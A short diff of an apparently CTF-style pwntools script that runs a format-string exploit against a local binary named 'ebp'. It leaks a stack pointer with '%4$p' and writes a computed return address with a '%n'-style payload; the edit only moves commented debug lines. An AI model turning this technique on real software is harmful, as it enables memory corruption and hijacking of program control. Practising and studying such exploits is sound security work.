@@ -13,13 +13,14 @@ buf_addr = 0x804a080
 io = process("./ebp")
 io.sendline("%4$p....")
 
-#  raw_input("DEBUG: ")
-#  gdb.attach(io)
 
 ebp_addr = int(io.recvuntil("....")[: -4], 16)
 ret_addr = (ebp_addr - 0x1c) & 0xffff
 
 payload = "%" + str(ret_addr) + "d%4$hn"
+#  raw_input("DEBUG: ")
+#  gdb.attach(io)
+
 io.sendline(payload)
 io.recvuntil("\n")
 
